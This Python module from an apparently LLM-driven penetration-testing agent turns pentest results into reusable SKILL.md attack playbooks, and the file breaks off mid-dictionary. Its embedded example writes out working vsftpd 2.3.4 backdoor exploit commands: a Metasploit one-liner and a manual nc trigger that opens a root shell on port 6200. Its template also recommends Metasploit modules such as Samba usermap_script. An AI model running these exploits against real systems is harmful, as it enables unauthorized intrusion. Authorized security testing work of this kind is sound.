"""
SkillGenerator — 从渗透测试结果中自动生成可复用的 SKILL.md 技能文件

输入: 渗透完成后的 State 对象
输出: 按 service/vulnerability 类型生成 SKILL.md 到 skills/learned/ 目录

生成策略（双层架构 v2.0）:
  第一层 — 程序提取事实:
    从 state 中抽取 service/CVE/成功命令/失败尝试/凭据
  第二层 — LLM 反思生成:
    调用 LLM 把事实加工成 v2.0 五段式 SKILL.md（Principle / Detection /
    Workflow / Failure Modes / Generalization）。LLM 不可用时回退到模板。

  - 成功的 exploit 路径 → 完整 exploit skill (v2.0 格式)
  - 发现漏洞但未利用 → recon skill (仅检测步骤)
  - 失败的尝试 → 不单独生成，但会作为 Failure Modes 注入到对应 skill
"""

from __future__ import annotations

import json
import os
import re
import textwrap
from datetime import datetime
from typing import Any, Optional


# 已知服务 → 标准化 service tag
SERVICE_TAG_MAP = {
    "ftp": "ftp", "ssh": "ssh", "telnet": "telnet", "smtp": "smtp",
    "http": "http", "https": "https", "apache": "http", "nginx": "http",
    "tomcat": "tomcat", "smb": "smb", "microsoft-ds": "smb", "netbios-ssn": "smb",
    "mysql": "mysql", "postgres": "postgresql", "postgresql": "postgresql",
    "vnc": "vnc", "irc": "irc", "distcc": "distcc", "rmi": "java-rmi",
    "bindshell": "shell", "backdoor": "backdoor",
    "shell": "shell", "login": "login", "exec": "exec",
}


def _normalize_service_tag(service: str) -> str:
    lowered = str(service or "").strip().lower()
    for key, tag in SERVICE_TAG_MAP.items():
        if key in lowered:
            return tag
    return lowered.split()[0] if lowered else "unknown"


def _clean_service_name(service: str) -> str:
    """规范化服务名用于跨靶机复用（P5 修复）

    nmap 的 service 字段格式是 `<protocol>  <product> <version>`，
    内部多个空格分隔。这导致 Detection Fingerprint 写出来是
    "包含 `ftp     vsftpd 2.3.4`" —— 下次靶机版本不同就不会触发。

    规范化策略：
    1. 压缩多空格为单空格
    2. 去掉版本号尾部的括号注释（如 `((Unix))`）
    3. 保留协议+产品+主版本号（如 `vsftpd 2.3.4`）
    """
    s = str(service or "").strip()
    if not s:
        return "unknown"
    # 压缩多空格
    s = re.sub(r"\s+", " ", s)
    # 去掉尾部括号（如 ((Unix)) ((Ubuntu) DAV/2)）
    s = re.sub(r"\s*\(\(?[^)]*\)\)?\s*", " ", s).strip()
    # 协议字段（如 ftp/http/ssh）如果重复出现，去掉前缀
    parts = s.split(" ", 1)
    if len(parts) == 2:
        protocol = parts[0].lower()
        rest = parts[1]
        # 如果第一段是协议名且 rest 已经有产品名，丢掉协议
        if protocol in {"ftp", "http", "https", "ssh", "telnet", "smtp", "smb",
                        "samba", "mysql", "postgresql", "postgres", "redis",
                        "vnc", "irc", "rmi", "tomcat", "rpcbind", "domain",
                        "netbios-ssn", "microsoft-ds", "exec", "login",
                        "ircs-u", "ajp13", "apachemq", "rsh", "rlogin",
                        "shell", "ingreslock", "distccd", "drb", "bindshell"}:
            return rest.strip() or protocol
    return s.strip()


def _service_family(service: str) -> str:
    """提取服务大类，用于推广 (vsftpd 2.3.4 -> vsftpd, Apache httpd 2.4.49 -> Apache httpd)"""
    cleaned = _clean_service_name(service)
    # 去掉版本号
    m = re.match(r"([A-Za-z][\w.-]*(?:\s+[A-Za-z][\w.-]*)?)", cleaned)
    if m:
        return m.group(1).strip()
    return cleaned


def _sanitize_name(text: str) -> str:
    text = str(text or "").strip().lower()
    text = re.sub(r"[^a-z0-9_-]+", "-", text)
    text = re.sub(r"-+", "-", text).strip("-")
    return text[:64] or "unnamed"


def _extract_version_tag(service: str) -> str:
    """从服务指纹中提取版本标签，如 'vsftpd 2.3.4' → 'vsftpd-234'"""
    lowered = str(service or "").strip().lower()
    # 提取服务名 + 版本号
    match = re.match(r"(\S+)\s+(\d+[\d.]*)", lowered)
    if match:
        name = match.group(1).strip()
        version = match.group(2).strip().replace(".", "")
        return f"{name}-{version}"
    # 只有服务名没有版本
    name = lowered.split()[0] if lowered else ""
    if name and len(name) >= 3:
        return name
    return ""


class SkillGenerator:
    """从渗透测试 State 中自动生成 SKILL.md 技能文件"""

    def __init__(self, skills_root: str, llm_client: Optional[Any] = None,
                 online_search_results: Optional[list[dict]] = None):
        """
        Args:
            skills_root: skills/ 根目录
            llm_client: 可选的 LLM 客户端（需要实现 chat(messages) -> str 接口）。
                       不传则回退到纯模板生成。
            online_search_results: 本次渗透的联网检索结果日志（来自
                       OnlineSearchService.get_results_log()）。注入到 LLM prompt，
                       让生成的 Principle 章节基于 NVD 权威信息而非模型记忆。
        """
        self.skills_root = skills_root
        # P0: 生成的 skill 默认进入 draft 目录，经过 LifecycleManager 自动晋升
        self.learned_dir = os.path.join(skills_root, "learned", "draft")
        self.llm_client = llm_client
        self.online_search_results = online_search_results or []
        self._existing_skill_names: set[str] = set()
        self._load_existing_skill_names()

    def _load_existing_skill_names(self):
        """扫描已有 skill 文件名，避免重复生成"""
        for root, dirs, files in os.walk(self.skills_root):
            for f in files:
                if f.endswith(".md"):
                    name = f.replace(".md", "").replace("SKILL", "").strip("-_").lower()
                    if name:
                        self._existing_skill_names.add(name)

    def _has_existing_skill(self, skill_name: str, path: dict) -> bool:
        """检查是否已有同名或功能相同的预置 skill"""
        # 精确名字匹配
        if skill_name in self._existing_skill_names:
            return True
        # 检查 service tag 是否有对应的 exploit skill
        tag = path.get("tag", "")
        if tag:
            for existing in self._existing_skill_names:
                if f"exploit-{tag}" in existing or f"{tag}-backdoor" in existing:
                    return True
        return False

    def generate_from_state(self, state) -> list[str]:
        """
        从完成的渗透状态中提取经验，生成 skill 文件。

        Returns:
            生成的 skill 文件路径列表
        """
        os.makedirs(self.learned_dir, exist_ok=True)

        data = state.data if hasattr(state, "data") else state
        findings = data.get("findings", [])
        actions = data.get("actions_taken", [])
        credentials = data.get("credentials", [])
        vulnerabilities = data.get("vulnerabilities", [])
        targets = data.get("targets", [])
        sessions = data.get("sessions", [])

        generated_files: list[str] = []

        # 1. 按 service 聚类成功的攻击路径（同时收集失败尝试用于 Failure Modes）
        attack_paths = self._extract_attack_paths(
            findings, actions, credentials, vulnerabilities, sessions, targets
        )

        # 2. 每条攻击路径生成一个 skill（跳过已有预置 skill 的）
        for path in attack_paths:
            skill_name = _sanitize_name(path['name'])
            if self._has_existing_skill(skill_name, path):
                continue

            # 优先用 LLM 反思生成 v2.0 格式；失败时回退到模板
            skill_content = None
            if self.llm_client is not None and path.get("exploit_success"):
                try:
                    skill_content = self._render_skill_md_v2_with_llm(path)
                except Exception as exc:
                    # LLM 失败不影响流程，回退模板
                    print(f"[SkillGenerator] LLM 生成失败，回退模板：{exc}")
                    skill_content = None

            if not skill_content:
                skill_content = self._render_skill_md(path)

            filename = f"{skill_name}.md"
            filepath = os.path.join(self.learned_dir, filename)
            with open(filepath, "w", encoding="utf-8") as f:
                f.write(skill_content)
            generated_files.append(filepath)

        # 3. 生成汇总 skill
        if attack_paths:
            summary = self._render_summary_skill(attack_paths, targets)
            summary_path = os.path.join(self.learned_dir, "pentest-summary.md")
            with open(summary_path, "w", encoding="utf-8") as f:
                f.write(summary)
            generated_files.append(summary_path)

        return generated_files

    def _extract_attack_paths(
        self,
        findings: list[dict],
        actions: list[dict],
        credentials: list[dict],
        vulnerabilities: list[dict],
        sessions: list[dict],
        targets: list[str],
    ) -> list[dict]:
        """从渗透结果中提取成功的攻击路径"""
        paths: list[dict] = []

        # 按 port+service 聚类 findings
        service_map: dict[tuple[int, str], dict] = {}
        for f in findings:
            if not isinstance(f, dict):
                continue
            port = f.get("port")
            if isinstance(port, str) and port.isdigit():
                port = int(port)
            if not isinstance(port, int):
                continue
            service = str(f.get("service", "")).strip()
            ip = str(f.get("ip", "")).strip() or (targets[0] if targets else "")
            key = (port, _normalize_service_tag(service))
            if key not in service_map:
                service_map[key] = {
                    "port": port,
                    "service": service,
                    "ip": ip,
                    "tag": _normalize_service_tag(service),
                }

        # 找出每个 service 相关的成功 action
        successful_actions = [
            a for a in actions
            if isinstance(a, dict) and a.get("status") == "completed"
            and a.get("tool") not in {"_doctor", "_llm_wait", "_token_usage", "_done", "_skip", "_llm_error"}
        ]

        # 找出失败的 action（用于生成 Failure Modes）
        failed_actions = [
            a for a in actions
            if isinstance(a, dict)
            and a.get("status") in {"failed", "error", "timeout"}
            and a.get("tool") not in {"_doctor", "_llm_wait", "_token_usage", "_done", "_skip", "_llm_error"}
        ]

        # 找出有 exploit 成功证据的 action
        exploit_actions = [
            a for a in successful_actions
            if self._has_exploit_evidence(a)
        ]

        # 为每个高价值 service 生成攻击路径
        for (port, tag), svc_info in service_map.items():
            # 找与此 service 相关的成功 action
            related_actions = [
                a for a in successful_actions
                if self._action_targets_port(a, port) or self._action_targets_service(a, svc_info["service"])
            ]
            if not related_actions:
                continue

            # 找相关的 credential
            related_creds = [
                c for c in credentials
                if isinstance(c, dict) and self._cred_matches_service(c, tag)
            ]

            # 找相关的 vulnerability
            related_vulns = [
                v for v in vulnerabilities
                if isinstance(v, dict) and self._vuln_matches_port(v, port)
            ]

            # 找是否有 exploit 成功
            exploit_success = any(
                self._action_targets_port(a, port) and self._has_exploit_evidence(a)
                for a in exploit_actions
            )

            # 找成功的命令
            successful_commands = [
                {"tool": a.get("tool", ""), "args": a.get("args", ""), "result": (a.get("result", "") or "")[:200]}
                for a in related_actions
                if a.get("tool") not in {"_doctor", "_llm_wait", "_token_usage", "_done", "_skip", "_llm_error"}
            ]

            # 找此 service 相关的失败命令（→ Failure Modes 的素材）
            related_failures = [
                {
                    "tool": a.get("tool", ""),
                    "args": str(a.get("args", ""))[:200],
                    "error": (a.get("error", "") or str(a.get("result", "")))[:200],
                }
                for a in failed_actions
                if self._action_targets_port(a, port) or self._action_targets_service(a, svc_info["service"])
            ][:5]  # 最多取 5 条

            # 用服务版本构建更精确的 skill 名字
            version_tag = _extract_version_tag(svc_info["service"])
            if version_tag:
                name = f"exploit-{version_tag}" if exploit_success else f"recon-{version_tag}"
            else:
                name = f"exploit-{tag}-{port}" if exploit_success else f"recon-{tag}-{port}"

            path = {
                "name": name,
                "port": port,
                "service": svc_info["service"],
                "tag": tag,
                "ip": svc_info["ip"],
                "exploit_success": exploit_success,
                "credentials": related_creds,
                "vulnerabilities": related_vulns,
                "commands": successful_commands,
                "failures": related_failures,
                "sessions": [s for s in sessions if isinstance(s, dict)],
            }
            paths.append(path)

        # 按 exploit 成功优先排序
        paths.sort(key=lambda p: (not p["exploit_success"], p["port"]))
        return paths

    def _has_exploit_evidence(self, action: dict) -> bool:
        text = " ".join(str(action.get(k, "")) for k in ("result", "error", "full_stdout")).lower()
        indicators = [
            "uid=0(", "root@", "meterpreter session", "command shell session",
            "shell opened", "session opened", "login successful", "access granted",
            "interactive_session_connected", "nt authority\\system",
            "uid=", "whoami", "id;", "/bin/sh", "/bin/bash",
            "session 1 opened", "session 2 opened", "authenticated",
            "exploit completed", "exploit succeeded",
        ]
        # Also check if the action is msfconsole with status=completed (successful exploit)
        if action.get("tool") == "msfconsole" and action.get("status") == "completed":
            return True
        return any(ind in text for ind in indicators)

    def _action_targets_port(self, action: dict, port: int) -> bool:
        explicit_ports = {
            int(p) for p in (action.get("ports") or [])
            if isinstance(p, int) or str(p).isdigit()
        }
        if port in explicit_ports:
            return True
        args = str(action.get("args", ""))
        return bool(re.search(rf"(?:^|\D){port}(?:\D|$)", args))

    def _action_targets_service(self, action: dict, service: str) -> bool:
        if not service:
            return False
        args = str(action.get("args", "")).lower()
        surface = str(action.get("surface", "")).lower()
        svc_lower = service.lower()
        return svc_lower in args or svc_lower in surface

    def _cred_matches_service(self, cred: dict, tag: str) -> bool:
        source = str(cred.get("source", "")).lower()
        kind = str(cred.get("kind", "")).lower()
        return tag in source or tag in kind or not source

    def _vuln_matches_port(self, vuln: dict, port: int) -> bool:
        vuln_port = vuln.get("port")
        if isinstance(vuln_port, int):
            return vuln_port == port
        if isinstance(vuln_port, str) and vuln_port.isdigit():
            return int(vuln_port) == port
        target = str(vuln.get("target", ""))
        return str(port) in target

    # ─────────────────────────────────────────────────────────────
    # LLM 反思生成 v2.0 格式 SKILL.md
    # ─────────────────────────────────────────────────────────────

    # 内置的范例 skill（vsftpd 后门）作为 LLM 的格式标杆
    _V2_TEMPLATE_EXAMPLE = textwrap.dedent("""
    ---
    name: exploit-vsftpd-backdoor
    description: vsftpd 2.3.4 源码后门 RCE（CVE-2011-2523）。banner 含 "vsftpd 2.3.4" 即可触发。
    domain: penetration-testing
    subdomain: exploitation
    tags: [vsftpd, ftp, backdoor, CVE-2011-2523, supply-chain, rce]
    cve: CVE-2011-2523
    severity: critical
    version: '2.0'
    ---

    # exploit-vsftpd-backdoor

    ## Principle
    2011 年 vsftpd 2.3.4 官方源码包被植入恶意代码。FTP 客户端发送用户名含 `:)`
    时服务端在 6200 端口启动 root bindshell。这是源码供应链投毒，不是内存破坏。

    ## Detection Fingerprint
    必须满足以下条件之一才能触发：
    - `nmap -sV -p21` banner 显示 `vsftpd 2.3.4`
    - 触发后 `nc <target> 6200` 可连接

    反例（不要触发）：vsftpd 2.3.5 / 3.x 已修复；Debian 仓库版已打补丁。

    ## Workflow
    ### 方法 A：Metasploit
    ```
    msfconsole -q -x 'use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS {target}; run'
    ```
    ### 方法 B：手动触发
    ```
    printf 'USER hacker:)\\r\\nPASS x\\r\\n' | nc -w 5 {target} 21
    nc {target} 6200
    ```

    ## Failure Modes
    | 现象 | 原因 | 下一步 |
    |---|---|---|
    | 6200 连接被拒绝 | 防火墙/发行版补丁 | 跳过，转 ssh-bruteforce |
    | msf 报 Exploit failed | 后门已清理 | 同上 |

    ## Generalization
    这是"源码供应链后门"漏洞类。识别套路：
    1. 服务版本号是单一精确值
    2. CVE 描述含 "backdoor" / "trojaned source"
    3. 利用 = 发送魔法字符串 → 连接后门端口/触发命令

    同类：UnrealIRCd 3.2.8.1 (CVE-2010-2075)、ProFTPd 1.3.3c。

    ## Key Concepts
    | 字段 | 值 |
    |---|---|
    | CVE | CVE-2011-2523 |
    | 影响版本 | vsftpd 2.3.4 |
    | 触发字符 | username 含 `:)` |
    | 后门端口 | 6200/tcp |
    """).strip()

    def _render_skill_md_v2_with_llm(self, path: dict) -> Optional[str]:
        """调用 LLM 把渗透事实加工成 v2.0 格式 SKILL.md。

        失败返回 None，让调用方回退到模板版。
        """
        if not self.llm_client:
            return None

        # 1) 准备事实摘要喂给 LLM
        service = path.get("service", "")
        port = path.get("port", "")
        commands = path.get("commands", [])
        credentials = path.get("credentials", [])
        vulnerabilities = path.get("vulnerabilities", [])
        failures = path.get("failures", [])

        # 提取可能的 CVE
        cves = set()
        for v in vulnerabilities:
            cve_id = v.get("cve") or v.get("name") or ""
            for m in re.findall(r"CVE-\d{4}-\d+", str(cve_id), re.IGNORECASE):
                cves.add(m.upper())
        for cmd in commands:
            text = f"{cmd.get('args','')} {cmd.get('result','')}"
            for m in re.findall(r"CVE-\d{4}-\d+", text, re.IGNORECASE):
                cves.add(m.upper())

        facts = {
            "service": service,
            "port": port,
            "detected_cves": sorted(cves),
            "successful_commands": [
                {"tool": c.get("tool", ""), "args": str(c.get("args", ""))[:150]}
                for c in commands[:6]
            ],
            "credentials_found": [
                {"user": c.get("username", "?"), "pass": c.get("password", "?")[:20]}
                for c in credentials[:3]
            ],
            "vulnerabilities": [
                {"name": v.get("name", ""), "severity": v.get("severity", "")}
                for v in vulnerabilities[:5]
            ],
            "failed_attempts": failures[:5],
        }

        skill_name = _sanitize_name(path.get("name", "auto-skill"))

        prompt = self._build_v2_generation_prompt(skill_name, facts)

        # 2) 调用 LLM
        messages = [
            {
                "role": "system",
                "content": (
                    "你是一名资深渗透测试技能文档作者。你的任务是把渗透测试的实际执行结果"
                    "整理成可复用、可教学的 SKILL.md 文档。要求：\n"
                    "1. 严格按用户给出的 v2.0 五段式格式（Principle / Detection Fingerprint / "
                    "Workflow / Failure Modes / Generalization）输出。\n"
                    "2. Principle 章节要解释漏洞的真正原理（不是怎么打，而是为什么能打）。\n"
                    "3. Generalization 章节必须给出同类漏洞列表和通用利用模板。\n"
                    "4. Failure Modes 用表格列出常见失败现象 + 原因 + 下一步建议。\n"
                    "5. 只输出 SKILL.md 的完整 Markdown 内容，不要任何额外说明。"
                ),
            },
            {"role": "user", "content": prompt},
        ]

        try:
            response = self._call_llm(messages)
        except Exception as exc:
            print(f"[SkillGenerator] LLM 调用异常: {exc}")
            return None

        if not response or not isinstance(response, str):
            return None

        # 3) 清洗响应（去掉可能的代码块包裹）
        cleaned = response.strip()
        if cleaned.startswith("```"):
            # 去掉 ```markdown\n ... \n```
            cleaned = re.sub(r"^```[a-zA-Z]*\n", "", cleaned)
            cleaned = re.sub(r"\n```\s*$", "", cleaned)

        # 4) 基本校验：必须含 frontmatter 和至少 3 个 v2.0 章节
        required_sections = ["## Principle", "## Workflow", "## Generalization"]
        if not cleaned.startswith("---") or sum(s in cleaned for s in required_sections) < 2:
            print(f"[SkillGenerator] LLM 输出格式不合格，回退模板")
            return None

        return cleaned

    def _build_v2_generation_prompt(self, skill_name: str, facts: dict) -> str:
        """构造让 LLM 生成 v2.0 skill 的 prompt"""
        facts_json = json.dumps(facts, ensure_ascii=False, indent=2)

        # 注入联网检索结果（NVD 权威 CVE 信息），让 Principle 章节基于权威数据
        online_context = self._build_online_search_context(facts)

        online_section = ""
        if online_context:
            online_section = textwrap.dedent(f"""
            ## 联网检索到的权威信息（必须参考）
            以下是本次渗透中通过联网检索（NVD / Rapid7 等）查到的权威数据。
            **Principle 章节必须基于这些权威信息撰写**，不要凭训练记忆猜测 CVE 细节。
            ```json
            {online_context}
            ```
            """).strip()
        else:
            online_section = (
                "## 联网检索结果\n"
                "本次渗透未触发联网检索或无相关结果。Principle 章节基于渗透事实和你的"
                "专业知识撰写，但请在 Generalization 中注明'未经 NVD 查证，细节待核实'。"
            )

        return textwrap.dedent(f"""
        请根据以下渗透测试事实，生成一份 v2.0 格式的 SKILL.md 文档。

        ## 渗透事实
        ```json
        {facts_json}
        ```

        {online_section}

        ## skill 名称
        `{skill_name}`

        ## v2.0 格式范例（严格参考此结构和详细程度）
        ---START EXAMPLE---
        {self._V2_TEMPLATE_EXAMPLE}
        ---END EXAMPLE---

        ## 你的任务
        基于"渗透事实"和"联网检索到的权威信息"，按照上面范例的五段式结构
        （Principle / Detection Fingerprint / Workflow / Failure Modes /
        Generalization / Key Concepts），用**中文**写一份新的 SKILL.md。

        关键要求：
        1. **Principle**：解释这类漏洞的根本原理。如果检测到具体 CVE 且有联网检索结果，
           **必须以联网检索到的 NVD 描述为准**（权威性 > 训练记忆）。不要只写"漏洞利用"
           四个字，要讲清楚"为什么有这个漏洞、怎么形成的"。
        2. **Detection Fingerprint**：列出至少 2 条精确的检测条件 + 反例。
        3. **Workflow**：根据"successful_commands"提炼，给出 2-3 种方法（msf / 手动 / 备选）。
        4. **Failure Modes**：把"failed_attempts"总结成失败现象表，并补充常见失败场景。
           即使没有失败记录，也要根据漏洞原理推演 3-5 个常见失败情况。
        5. **Generalization**：**这是最重要的章节**。识别这是哪一类漏洞，列出同类漏洞，
           给出通用利用模板。
        6. frontmatter 必须含 name、description、domain、tags；若知道 CVE 加上 cve 字段。
        7. 输出**只能是 SKILL.md 内容本身**，不要解释、不要前置说明。

        现在请输出 SKILL.md：
        """).strip()

    def _build_online_search_context(self, facts: dict) -> str:
        """从联网检索结果中提取与当前 skill 相关的权威信息，格式化为 JSON 字符串。"""
        if not self.online_search_results:
            return ""

        # 当前 skill 涉及的 CVE（从 facts 中提取）
        related_cves = set(str(c).upper() for c in facts.get("detected_cves", []))
        service = str(facts.get("service", "")).lower()

        relevant: list[dict] = []
        for entry in self.online_search_results:
            if not entry.get("ok"):
                continue
            tool = entry.get("tool", "")
            data = entry.get("data") or {}

            # search_cve 结果：如果 CVE 与当前 skill 相关，收录
            if tool == "search_cve":
                cve_id = str(data.get("cve_id", "")).upper()
                if cve_id and (not related_cves or cve_id in related_cves):
                    relevant.append({
                        "source": "NVD",
                        "type": "cve_detail",
                        "cve_id": cve_id,
                        "description": data.get("description", ""),
                        "cvss_score": data.get("cvss_score"),
                        "cvss_severity": data.get("cvss_severity", ""),
                        "affected_products": [
                            a.get("cpe", "") for a in (data.get("affected_products") or [])[:5]
                        ],
                        "references": [
                            r.get("url", "") for r in (data.get("references") or [])[:5]
                        ],
                    })

            # search_exploit 结果：如果关键词与当前服务相关，收录
            elif tool == "search_exploit":
                keyword = str(data.get("keyword", "")).lower()
                if service and (service in keyword or keyword in service):
                    cve_matches = data.get("cve_matches") or []
                    relevant.append({
                        "source": "NVD-keyword",
                        "type": "exploit_search",
                        "keyword": data.get("keyword", ""),
                        "matched_cves": [
                            {"cve_id": c.get("cve_id", ""), "cvss": c.get("cvss_score"),
                             "description": c.get("description", "")[:150]}
                            for c in cve_matches[:5]
                        ],
                    })

            # lookup_msf_module / lookup_default_creds 结果：直接收录
            elif tool == "lookup_msf_module":
                module_name = str(data.get("module_name", "")).lower()
                if service and service in module_name:
                    relevant.append({
                        "source": "Rapid7",
                        "type": "msf_module",
                        "module_name": data.get("module_name", ""),
                        "description": data.get("description", ""),
                        "payloads": data.get("payloads", []),
                    })
            elif tool == "lookup_default_creds":
                product = str(data.get("product", "")).lower()
                if service and (service in product or product in service):
                    relevant.append({
                        "source": "default-creds-db",
                        "type": "default_credentials",
                        "product": data.get("product", ""),
                        "credentials": [
                            {"user": c.get("username", ""), "pass": c.get("password", "")}
                            for c in (data.get("credentials") or [])[:5]
                        ],
                    })

        if not relevant:
            return ""
        return json.dumps(relevant, ensure_ascii=False, indent=2)

    def _call_llm(self, messages: list[dict]) -> Optional[str]:
        """统一 LLM 调用入口。兼容多种客户端接口。

        关键适配（P4-1 修复）：
        - SDIT 的 LLMClient.chat(system_prompt, user_message) 是 async 的，
          且只接受两个 str 而非 messages list。
        - 先拆 messages 出 system + user 两段文本，然后用 asyncio 同步包装。
        - 失败时退到通用 chat(messages) / callable 路径。
        """
        client = self.llm_client
        if client is None:
            return None

        # 把 messages 拆成 system / user 文本（兼容标准 ChatML 结构）
        def _split(msgs):
            sys_text, user_text = "", ""
            for m in msgs or []:
                if not isinstance(m, dict):
                    continue
                role = str(m.get("role", "")).lower()
                content = m.get("content", "")
                if isinstance(content, list):
                    content = " ".join(
                        str(p.get("text", p)) if isinstance(p, dict) else str(p)
                        for p in content
                    )
                content = str(content or "")
                if role == "system":
                    sys_text = (sys_text + "\n\n" + content) if sys_text else content
                else:
                    user_text = (user_text + "\n\n" + content) if user_text else content
            return sys_text or "", user_text or ""

        sys_text, user_text = _split(messages)

        # 形态 0（首选）：SDIT LLMClient — async chat(system, user)
        chat = getattr(client, "chat", None)
        if callable(chat):
            import inspect, asyncio
            if inspect.iscoroutinefunction(chat):
                try:
                    try:
                        return asyncio.run(chat(sys_text, user_text))
                    except RuntimeError:
                        loop = asyncio.new_event_loop()
                        try:
                            return loop.run_until_complete(chat(sys_text, user_text))
                        finally:
                            loop.close()
                except Exception as exc:
                    print(f"[SkillGenerator] async chat 调用失败: {exc}")
                    # 不返回，继续尝试其他形态
            else:
                # 同步 chat：先试 (system, user) 签名
                for args_try in ((sys_text, user_text), (messages,)):
                    try:
                        result = chat(*args_try)
                        if isinstance(result, str) and result.strip():
                            return result
                    except TypeError:
                        continue
                    except Exception:
                        break

        # 形态 2：实现了 complete(messages) / generate(messages)
        for method_name in ("complete", "generate", "invoke", "run"):
            method = getattr(client, method_name, None)
            if callable(method):
                try:
                    result = method(messages)
                    if isinstance(result, dict):
                        return (
                            result.get("content")
                            or result.get("text")
                            or result.get("response")
                            or str(result)
                        )
                    return str(result) if result is not None else None
                except TypeError:
                    continue
                except Exception:
                    continue

        # 形态 3：是一个 callable
        if callable(client):
            try:
                result = client(messages)
                return str(result) if result is not None else None
            except Exception:
                return None

        return None

    # ─────────────────────────────────────────────────────────────
    # 模板回退版（保留兼容）
    # ─────────────────────────────────────────────────────────────

    def _render_skill_md(self, path: dict) -> str:
        """渲染单个攻击路径为 v2.0 五段式 SKILL.md（fallback 模板）

        P4-2 修复：补齐 Principle / Detection Fingerprint / Failure Modes /
        Generalization 四个章节 + frontmatter version 升级到 2.0，
        让 SkillQualityGate 能放行。
        """
        tag = path["tag"]
        port = path["port"]
        service_raw = path["service"]
        # P5 修复：规范化服务名用于跨靶机复用
        service = _clean_service_name(service_raw)
        family = _service_family(service_raw)
        exploit_success = path["exploit_success"]
        name = path["name"]
        ip = path.get("ip", "")
        creds = path.get("credentials", []) or []
        vulns = path.get("vulnerabilities", []) or []
        cmds = path.get("commands", []) or []
        failures = path.get("failures", []) or []
        sessions = path.get("sessions", []) or []

        # 提取 CVE（如果有的话）
        cves: list[str] = []
        for v in vulns:
            for m in re.findall(r"CVE-\d{4}-\d+", str(v.get("cve", "") or v.get("name", "")), re.IGNORECASE):
                if m.upper() not in cves:
                    cves.append(m.upper())

        # 严重度（vulns 里取最高）
        severity = "info"
        if vulns:
            sev_order = {"critical": 4, "high": 3, "medium": 2, "low": 1}
            best = max(
                (str(v.get("severity", "")).lower() for v in vulns if isinstance(v, dict)),
                key=lambda s: sev_order.get(s, 0),
                default="info",
            )
            if best in sev_order:
                severity = best

        # tags
        tags = [tag, f"port-{port}"]
        if exploit_success:
            tags.append("exploit")
        else:
            tags.append("recon")
        if vulns:
            tags.append("vulnerability")
        for c in cves[:3]:
            tags.append(c.lower())

        # description (P5: 用 family 而非原始字符串，便于检索)
        description = f"{'成功利用' if exploit_success else '检测到'} {family} 服务 (端口 {port}，本次版本 {service})"
        if creds:
            description += f"，凭据: {', '.join(c.get('username','?') for c in creds[:3])}"

        # frontmatter
        lines = [
            "---",
            f"name: {name}",
            f"description: {description}",
            "domain: penetration-testing",
            f"subdomain: {'exploitation' if exploit_success else 'reconnaissance'}",
            f"tags: [{', '.join(tags)}]",
        ]
        if cves:
            lines.append(f"cve: {cves[0]}")
        lines.append(f"severity: {severity}")
        lines.append("version: '2.0'")
        lines.append("source: auto-generated")
        lines.append("---")
        lines.append("")

        # ──── ## Principle（漏洞根因） ────
        lines.append("## Principle")
        lines.append("")
        if cves:
            lines.append(f"目标 {family}（端口 {port}）存在 {', '.join(cves[:3])} 漏洞。")
        if exploit_success:
            lines.append(
                f"本次渗透通过 {family} 服务（具体版本: {service}）直接获得了执行能力，"
                f"说明该服务存在以下根因之一："
            )
        else:
            lines.append(
                f"本次渗透在 {family}（端口 {port}）发现了潜在的可利用点。"
                f"该服务家族的常见漏洞根因包括："
            )
        # 给出基于服务类型的根因猜测
        principle_hints = {
            "ftp": "明文凭据传输、匿名访问、版本后门（vsftpd 2.3.4）、ProFTPD mod_copy 拷贝任意文件",
            "ssh": "弱凭据、密钥泄露、CVE-2018-15473 用户枚举",
            "telnet": "明文协议、默认凭据、未授权访问",
            "http": "Web 应用漏洞（注入/上传/RCE）、默认凭据、目录遍历、CGI 解析",
            "smb": "永恒之蓝、空会话、Samba CVE-2017-7494",
            "samba": "永恒之蓝、空会话、Samba CVE-2017-7494",
            "mysql": "空密码 / 默认凭据、UDF 提权、信息收集",
            "postgresql": "弱密码、CVE-2019-9193 命令执行",
            "redis": "未授权访问 + 主从复制 RCE + 写 SSH key/crontab",
            "tomcat": "manager 默认凭据 + WAR 包上传 RCE",
            "vnc": "无密码 / 弱密码暴力枚举",
            "irc": "UnrealIRCd 3.2.8.1 后门 (CVE-2010-2075)",
            "rmi": "Java RMI 反序列化 (msf java_rmi_server)",
            "distccd": "distccd 命令执行（CVE-2004-2687）",
        }
        principle_text = principle_hints.get(tag.lower(), f"{service} 服务的常见配置错误或已知 CVE")
        lines.append(f"- {principle_text}")
        if creds:
            lines.append(f"- 弱口令 / 默认凭据被命中：{', '.join(c.get('username','?') for c in creds[:5])}")
        lines.append("")

        # ──── ## Detection Fingerprint（触发条件） ────
        lines.append("## Detection Fingerprint")
        lines.append("")
        lines.append("当满足以下条件时，**应触发本 skill** 进行验证/利用：")
        lines.append("")
        # P5 修复：触发条件用 family 关键词，而非整段未规范化字符串
        lines.append(f"1. nmap 服务指纹包含关键词 `{family}` 或目标开放端口 {port}")
        lines.append(f"   （本次具体版本: `{service}`，但同家族其他版本同样适用）")
        if cves:
            lines.append(f"2. nmap NSE / searchsploit / vulners 上报了 {', '.join(cves[:3])}")
        if creds:
            lines.append(f"3. 已知/已收集到凭据池含: {', '.join(c.get('username','?') for c in creds[:5])}")
        lines.append("")
        lines.append("**反例（不应触发本 skill）**：")
        lines.append(f"- {family} 已升级到已修复版本（参考 CVE 详情确认 fixed_version）")
        lines.append(f"- 端口 {port} 未开放或服务已被替换为其他产品")
        lines.append("")

        # ──── ## Workflow（执行步骤） ────
        lines.append("## Workflow")
        lines.append("")
        target_var = ip if ip else "TARGET"
        lines.append(f"### Step 1: 确认服务指纹")
        lines.append("```bash")
        lines.append(f"nmap -Pn -sV -sC -p {port} {target_var}")
        lines.append("```")
        lines.append("")
        if exploit_success and cmds:
            lines.append(f"### Step 2: 利用（本次渗透实际执行的命令）")
            for i, c in enumerate(cmds[:6], 1):
                args_s = str(c.get("args", "") or "")[:200]
                tool = c.get("tool", "?")
                lines.append("```bash")
                lines.append(f"# [{i}] tool={tool}")
                lines.append(f"{tool} {args_s}".strip())
                lines.append("```")
                result = str(c.get("result", "") or "")[:160]
                if result:
                    lines.append(f"  ↳ 结果: `{result}`")
                lines.append("")
        else:
            lines.append("### Step 2: 推荐尝试")
            recommend = {
                "ftp": "msfconsole -q -x \"use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS {t}; run\"",
                "smb": "msfconsole -q -x \"use exploit/multi/samba/usermap_script; set RHOSTS {t}; run\"",
